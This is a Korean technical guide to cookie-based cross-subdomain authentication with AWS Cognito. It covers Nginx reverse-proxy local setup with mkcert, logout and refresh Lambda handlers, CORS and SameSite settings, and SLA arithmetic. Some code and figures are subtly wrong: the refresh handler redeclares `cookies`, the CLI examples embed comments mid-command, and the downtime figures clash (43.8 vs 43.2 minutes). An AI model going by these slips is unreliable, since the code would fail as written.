### 2. Cognito HTTPS 강제 정책

#### Redirect URL 제약

```bash
# Cognito User Pool Client 설정
aws cognito-idp update-user-pool-client \
  --user-pool-id ap-northeast-2_XXXXX \
  --client-id abc123 \
  --callback-urls \
    "https://accounts.ddcn41.com/callback"  ✅ HTTPS
    "http://localhost:3002/callback"        ❌ HTTP (Cognito가 거부)
```

**Cognito의 HTTPS 강제 이유**:
```
1. Authorization Code가 URL에 노출
   http://localhost:3002/callback?code=xyz789
   → HTTP는 평문 전송 (중간자 공격 위험)

2. 토큰 교환 시 client_secret 전송
   → HTTP는 탈취 위험

3. OAuth 2.0 보안 권장사항
   → HTTPS 필수
```

#### localhost HTTPS 설정의 어려움

```bash
# 1. Self-Signed Certificate (브라우저 경고)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
# → 브라우저: "이 사이트는 안전하지 않습니다"

# 2. mkcert (로컬 CA 신뢰)
mkcert -install
mkcert localhost
# → 브라우저: 경고 없음
# → 각 개발자 환경마다 설정 필요
# → CI/CD 환경에서 추가 설정

# 3. Cognito Redirect URL 등록
aws cognito-idp update-user-pool-client \
  --callback-urls "https://localhost:3002/callback"
# → Secure 플래그 필수
```

### 3. 해결 방법: Docker + Nginx Reverse Proxy

#### 아키텍처

```
┌─────────────────────────────────────────┐
│   Nginx Reverse Proxy (Docker)         │
│   http://app.local (또는 HTTPS)         │
└───────────────┬─────────────────────────┘
                │
    ┌───────────┼───────────┬───────────┐
    │           │           │           │
    ▼           ▼           ▼           ▼
┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐
│ Client │ │ Admin  │ │Accounts│ │Backend │
│ :3000  │ │ :3001  │ │ :3002  │ │ :8080  │
└────────┘ └────────┘ └────────┘ └────────┘
```

#### docker-compose.yml

```yaml
version: '3.8'

services:
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"  # HTTPS (mkcert 사용 시)
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./certs:/etc/nginx/certs:ro  # mkcert 인증서
    depends_on:
      - client
      - admin
      - accounts
      - backend
      - lambda-mock
    networks:
      - app-network

  # Frontend 서비스들은 Host Network로 실행
  # (Vite Dev Server는 Docker 밖에서 실행)

networks:
  app-network:
    driver: bridge
```

#### nginx.conf

```nginx
http {
    upstream client_frontend {
        server host.docker.internal:3000;  # Mac/Windows
        # server 172.17.0.1:3000;          # Linux
    }
    upstream admin_frontend {
        server host.docker.internal:3001;
    }
    upstream accounts_frontend {
        server host.docker.internal:3002;
    }
    upstream backend_api {
        server host.docker.internal:8080;
    }
    upstream lambda_auth {
        server host.docker.internal:4000;
    }

    server {
        listen 80;
        listen 443 ssl;  # HTTPS
        server_name app.local;

        # SSL 설정 (mkcert)
        ssl_certificate /etc/nginx/certs/app.local.pem;
        ssl_certificate_key /etc/nginx/certs/app.local-key.pem;

        # Client App
        location /client {
            proxy_pass http://client_frontend/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header Cookie $http_cookie;

            # WebSocket (Vite HMR)
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
        }

        # Admin App
        location /admin {
            proxy_pass http://admin_frontend/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header Cookie $http_cookie;

            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
        }

        # Accounts App
        location /accounts {
            proxy_pass http://accounts_frontend/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header Cookie $http_cookie;

            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
        }

        # Backend API
        location /api {
            proxy_pass http://backend_api/v1;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header Cookie $http_cookie;
        }

        # Lambda Auth Mock
        location /auth {
            proxy_pass http://lambda_auth/v2/auth;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header Cookie $http_cookie;
        }
    }
}
```

#### /etc/hosts 설정

```bash
# Mac/Linux
sudo sh -c 'echo "127.0.0.1  app.local" >> /etc/hosts'

# Windows (관리자 권한 CMD)
echo 127.0.0.1  app.local >> C:\Windows\System32\drivers\etc\hosts
```

#### 쿠키 설정 (Lambda Mock)

```javascript
// Lambda Auth Mock 응답
export function handler(event) {
  // ...로그인 검증...

  return {
    statusCode: 200,
    headers: {
      'Access-Control-Allow-Origin': 'http://app.local',
      'Access-Control-Allow-Credentials': 'true',
    },
    cookies: [
      `access_token=${accessToken}; Domain=.app.local; HttpOnly; Path=/; Max-Age=3600`,
      `id_token=${idToken}; Domain=.app.local; HttpOnly; Path=/; Max-Age=3600`,
      `refresh_token=${refreshToken}; Domain=.app.local; HttpOnly; Path=/; Max-Age=2592000`
    ],
    body: JSON.stringify({ message: 'Login successful' })
  };
}
```

#### 실행 방법

```bash
# 1. Nginx 시작
docker-compose up -d nginx

# 2. Frontend 앱들 실행 (별도 터미널)
cd frontend
pnpm dev:client   # localhost:3000
pnpm dev:admin    # localhost:3001
pnpm dev:accounts # localhost:3002

# 3. Backend 실행
cd backend
./gradlew bootRun  # localhost:8080

# 4. Lambda Mock 실행
cd backend/lambda/auth-gateway
npm start  # localhost:4000

# 5. 브라우저에서 접근
# http://app.local/client
# http://app.local/admin
# http://app.local/accounts

# 쿠키가 .app.local 도메인으로 공유됨!
```

### 4. Cognito Hosted UI 로컬 테스트

#### Callback URL 등록

```bash
# Cognito User Pool Client 설정
aws cognito-idp update-user-pool-client \
  --user-pool-id ap-northeast-2_XXXXX \
  --client-id abc123 \
  --callback-urls \
    "https://app.local/accounts/callback"  # mkcert HTTPS 필요
    "http://localhost/accounts/callback"   # 포트 없는 localhost (불안정)
```

**주의사항**:
1. **HTTPS 필수**: `https://app.local` (mkcert로 인증서 생성)
2. **Secure 플래그**: 쿠키에 `Secure` 플래그 필수
3. **Localhost 포트**: `http://localhost:3002`는 작동 안 함

---

## 주의사항 및 Best Practices

### 1. Hosted UI 로그아웃 시 쿠키 제거

#### 문제 상황

```javascript
// 사용자가 로그아웃 버튼 클릭
// Lambda Auth Gateway → Cognito Logout URL 리다이렉트
const logoutUrl = `https://${COGNITO_DOMAIN}/logout?
  client_id=${CLIENT_ID}&
  logout_uri=https://accounts.ddcn41.com/login`;

window.location.href = logoutUrl;

// 문제:
// 1. Cognito에서 로그아웃 처리
// 2. 브라우저 쿠키는 그대로 남아있음
// 3. 사용자가 다시 로그인 시도
// 4. Hosted UI가 쿠키를 확인하고 "이미 로그인됨"으로 판단
// 5. 자동으로 로그인 처리 (재로그인 없이)
// 6. 하지만 토큰은 무효화됨 (Cognito에서 Revoke됨)
// 7. API 호출 시 401 Unauthorized 에러
```

#### 올바른 로그아웃 처리

```javascript
// Lambda Auth Gateway: /v2/auth/logout
export async function handleLogout(event) {
  const cognitoDomain = process.env.COGNITO_DOMAIN;
  const clientId = process.env.COGNITO_CLIENT_ID;
  const logoutUri = 'https://accounts.ddcn41.com/login';

  // 1. Cognito Logout URL 생성
  const cognitoLogoutUrl = `https://${cognitoDomain}/logout?` +
    `client_id=${clientId}&` +
    `logout_uri=${encodeURIComponent(logoutUri)}`;

  // 2. 쿠키 제거 (MaxAge=0)
  const cookies = [
    'access_token=; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=0',
    'id_token=; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=0',
    'refresh_token=; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=0'
  ];

  // 3. Cognito Logout URL로 리다이렉트
  return {
    statusCode: 302,
    headers: {
      'Location': cognitoLogoutUrl,
      'Access-Control-Allow-Origin': 'https://accounts.ddcn41.com',
      'Access-Control-Allow-Credentials': 'true',
    },
    cookies,
    body: ''
  };
}
```

#### 로그아웃 플로우

```
1. Frontend → Lambda Auth Gateway
   POST /v2/auth/logout

2. Lambda 응답
   302 Found
   Location: https://ap-northeast-2u5ovprfcs.auth.ap-northeast-2.amazoncognito.com/logout?...
   Set-Cookie: access_token=; Max-Age=0
   Set-Cookie: id_token=; Max-Age=0
   Set-Cookie: refresh_token=; Max-Age=0

3. Browser → Cognito Logout URL
   → Cognito에서 세션 무효화

4. Cognito → Redirect to logout_uri
   https://accounts.ddcn41.com/login

5. 사용자는 로그인 페이지로 이동
   → 쿠키가 제거되어 재인증 필요
```

### 2. Token Refresh 전략

#### Access Token 만료 처리

```typescript
// Frontend API Client
async function apiCall(path: string, options?: RequestInit) {
  let response = await fetch(path, {
    ...options,
    credentials: 'include'  // 쿠키 자동 전송
  });

  // 401 Unauthorized → Token 갱신 시도
  if (response.status === 401) {
    const refreshed = await refreshAccessToken();

    if (refreshed) {
      // 재시도
      response = await fetch(path, {
        ...options,
        credentials: 'include'
      });
    } else {
      // Refresh Token도 만료 → 로그인 페이지
      window.location.href = '/login';
      throw new Error('Session expired');
    }
  }

  return response.json();
}

async function refreshAccessToken(): Promise<boolean> {
  try {
    const response = await fetch('/v2/auth/refresh', {
      method: 'POST',
      credentials: 'include'  // Refresh Token 쿠키 전송
    });

    if (response.ok) {
      // Lambda가 새로운 Access Token 쿠키 설정
      return true;
    }

    return false;
  } catch (error) {
    return false;
  }
}
```

#### Lambda Token Refresh Handler

```javascript
// /v2/auth/refresh
export async function handleRefresh(event) {
  // 1. Refresh Token 쿠키 추출
  const cookies = parseCookies(event.headers.cookie);
  const refreshToken = cookies['refresh_token'];

  if (!refreshToken) {
    return {
      statusCode: 401,
      body: JSON.stringify({ message: 'No refresh token' })
    };
  }

  // 2. Cognito Token Refresh
  const response = await cognitoClient.send(new InitiateAuthCommand({
    AuthFlow: 'REFRESH_TOKEN_AUTH',
    ClientId: process.env.COGNITO_CLIENT_ID,
    AuthParameters: {
      REFRESH_TOKEN: refreshToken
    }
  }));

  const { AccessToken, IdToken } = response.AuthenticationResult;

  // 3. 새로운 Access Token 쿠키 설정
  const cookies = [
    `access_token=${AccessToken}; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=3600`,
    `id_token=${IdToken}; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=3600`
  ];

  return {
    statusCode: 200,
    cookies,
    body: JSON.stringify({ message: 'Token refreshed' })
  };
}
```

### 3. CORS 설정 주의사항

#### 잘못된 설정 (작동 안 함)

```javascript
// ❌ Wildcard with Credentials
{
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Credentials': 'true'
}
// → 에러: Credential mode 'include' with wildcard origin not allowed
```

#### 올바른 설정

```javascript
// ✅ 특정 Origin 명시
function getCorsHeaders(origin) {
  const allowedOrigins = [
    'https://ddcn41.com',
    'https://accounts.ddcn41.com',
    'https://admin.ddcn41.com',
    'http://app.local'  // 로컬 개발
  ];

  return {
    'Access-Control-Allow-Origin': allowedOrigins.includes(origin)
      ? origin
      : 'https://ddcn41.com',
    'Access-Control-Allow-Credentials': 'true',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  };
}
```

### 4. SameSite 정책

#### 설정 비교

```javascript
// SameSite=Strict (가장 엄격)
Set-Cookie: token=abc; SameSite=Strict
// → Cross-Site 요청에서 쿠키 전송 안 됨
// → 예: Google 검색 → ddcn41.com 클릭 시 쿠키 안 보냄 (로그인 풀림)

// SameSite=Lax (권장)
Set-Cookie: token=abc; SameSite=Lax
// → GET 요청은 쿠키 전송 (탐색 가능)
// → POST, PUT, DELETE는 Same-Site만 (CSRF 방어)
// → 예: Google 검색 → ddcn41.com 클릭 시 쿠키 보냄 (로그인 유지)

// SameSite=None (제한 없음)
Set-Cookie: token=abc; SameSite=None; Secure
// → 모든 Cross-Site 요청에 쿠키 전송
// → Secure 플래그 필수 (HTTPS only)
// → iframe 내에서 인증 필요한 경우 사용
```

---

## 결론

### MSA 환경에서 쿠키 선택의 핵심 이유

1. **서브도메인 간 인증 공유**
   - `Domain=.ddcn41.com` 또는 `Domain=ddcn41.com` 설정으로 모든 `*.ddcn41.com`에서 쿠키 자동 전송
   - RFC 6265: leading dot은 무시되므로 두 방식 동일하게 동작
   - 로컬스토리지는 Same-Origin만 가능 (공유 불가)

2. **보안 강화**
   - `HttpOnly` 플래그로 XSS 공격 방어
   - `Secure` 플래그로 HTTPS 전용
   - `SameSite=Lax`로 CSRF 완화

3. **브라우저 자동 전송**
   - API 호출 시 쿠키 자동 포함
   - 로컬스토리지는 수동으로 헤더에 추가 필요

4. **단순한 구현**
   - 크로스 도메인 토큰 전달 로직 불필요
   - 토큰 갱신 등 자동 처리

### Cognito 선택의 핵심 이유

1. **AWS 생태계 통합**
   - CloudWatch 자동 로깅
   - Lambda Triggers 커스터마이징
   - SNS 알림 간편

2. **비용 효율성**
   - 월 10,000 MAU까지 무료
   - 자체 구축 대비 1/10 비용

3. **확장성**
   - MFA, Social Login 간편 추가
   - 사용자 그룹 및 권한 관리
   - AWS SLA 보장

**SLA (Service Level Agreement) 란?** ⁴

서비스 제공자가 고객에게 약속하는 서비스 품질 수준 및 보상 조건을 명시한 계약입니다.

```yaml
AWS Cognito SLA:
  보장 가동 시간: 99.9% (Three Nines)
  월간 허용 다운타임: 43.8분

  계산:
    - 월 총 시간: 30일 × 24시간 × 60분 = 43,200분
    - 99.9% 가동 = 43,200분 × 0.999 = 43,156.8분
    - 허용 다운타임 = 43,200분 - 43,156.8분 = 43.2분

  보상 정책:
    - 99.0% ~ 99.9%: 서비스 크레딧 10%
    - 95.0% ~ 99.0%: 서비스 크레딧 25%
    - <95.0%: 서비스 크레딧 100%

AWS 다른 서비스 SLA 비교:
  - S3: 99.9% (Three Nines)
  - EC2: 99.99% (Four Nines) - 월 4.3분 다운타임
  - DynamoDB: 99.99% (Four Nines)
  - RDS Multi-AZ: 99.95% (월 21.6분 다운타임)

SLA 용어:
  - 가동 시간 (Uptime): 서비스가 정상 작동하는 시간
  - 다운타임 (Downtime): 서비스가 중단된 시간
  - 가용성 (Availability): 가동 시간 / 총 시간 × 100%
  - 크레딧 (Service Credit): SLA 미달 시 AWS가 제공하는 보상

자체 구축 vs Cognito:
  자체 인증 서버 (EC2):
    - SLA: 보장 없음 (개발자 책임)
    - 가용성: 수동 모니터링 및 복구 필요
    - 다운타임: 배포, 패치, 장애 시 발생
    - 이중화: 직접 구성 및 관리
    - 비용: 서버 비용 + 인건비 + 모니터링 비용

  AWS Cognito:
    - SLA: 99.9% 보장 (AWS 책임)
    - 가용성: AWS Multi-AZ 자동 이중화
    - 다운타임: 월 43.8분 이하 보장
    - 이중화: AWS 자동 관리
    - 비용: MAU 10,000명까지 무료

실제 의미:
  99.9% SLA 보장:
    → 연간 8.76시간 (525.6분) 이하 다운타임
    → 월간 43.8분 이하 다운타임
    → 주간 10.1분 이하 다운타임
    → 일간 1.44분 이하 다운타임

  99.99% SLA 보장 (EC2):
    → 연간 52.56분 이하 다운타임
    → 월간 4.38분 이하 다운타임
    → 주간 1.01분 이하 다운타임
    → 일간 8.64초 이하 다운타임

SLA 모니터링:
  - CloudWatch로 Cognito 가용성 자동 모니터링
  - AWS Personal Health Dashboard에서 SLA 위반 알림
  - AWS Service Health Dashboard에서 실시간 상태 확인
  - SLA 위반 시 자동으로 크레딧 청구 가능
```

> ⁴ 참조: [AWS Cognito Service Level Agreement](https://aws.amazon.com/cognito/sla/)

### 로컬 개발 환경 권장 방법

1. **일상 개발**: JWT Bearer Token (localhost 그대로)
2. **통합 테스트**: Nginx Reverse Proxy + mkcert HTTPS
3. **CI/CD**: Staging 환경 + 실제 Cognito

---

## 참고 자료 (References)

### 공식 문서 (Official Documentation)

#### AWS CloudFront
- [CloudFront Cache Behavior Configuration](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/DownloadDistValuesCacheBehavior)
- [CloudFront Path Pattern Wildcards](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/distribution-web-values-specify.html#DownloadDistValuesPathPattern)
- [CloudFront TTL Settings](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html)

#### AWS Cognito
- [Amazon Cognito Service Level Agreement (SLA)](https://aws.amazon.com/cognito/sla/)
- [Amazon Cognito User Pools](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html)
- [AWS Cognito JWT Token Verification](https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html)
- [Amazon Cognito Passwordless Authentication](https://github.com/aws-samples/amazon-cognito-passwordless-auth)

#### AWS Application Load Balancer
- [Sticky Sessions with ALB](https://docs.aws.amazon.com/prescriptive-guidance/latest/load-balancer-stickiness/alb-cookies-stickiness.html)
- [Troubleshoot ALB Session Stickiness](https://repost.aws/knowledge-center/elb-alb-stickiness)

#### HTTP Cookies & Security
- [RFC 6265: HTTP State Management Mechanism (Cookies)](https://datatracker.ietf.org/doc/html/rfc6265)
- [RFC 6265bis: Cookies: HTTP State Management Mechanism](https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html)
- [draft-ietf-httpbis-cookie-same-site: SameSite Cookie Attribute](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-cookie-same-site-00)
- [MDN Web Docs: Set-Cookie Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN Web Docs: Using HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

#### Security Standards
- [OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN Web Docs: Cross-Site Request Forgery (CSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
- [SameSite Cookies Explained (web.dev)](https://web.dev/articles/samesite-cookies-explained)
- [Content Security Policy (CSP) Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### 기술 아티클 (Technical Articles)
- [Do SameSite Cookies Solve CSRF?](https://airman604.medium.com/do-samesite-cookies-solve-csrf-6dcd02dc9383)
- [Preventing CSRF Attacks with SameSite Cookie Attribute](https://www.invicti.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
- [SLA & Uptime Calculator](https://uptime.is/)

### 관련 프로젝트 문서
- [AUTH_COOKIE_SESSION_GUIDE.md](./AUTH_COOKIE_SESSION_GUIDE.md) - 쿠키 기반 세션 구현 가이드
- [COOKIE_SESSION_TROUBLESHOOTING.md](./COOKIE_SESSION_TROUBLESHOOTING.md) - 쿠키 세션 트러블슈팅
- [AUTH_FLOW_COMPLETE.md](./AUTH_FLOW_COMPLETE.md) - 완전한 인증 플로우
- [COGNITO_MIGRATION_GUIDE.md](./COGNITO_MIGRATION_GUIDE.md) - Cognito 마이그레이션 가이드

---

**작성일**: 2025-10-13
**최종 업데이트**: 2025-10-13
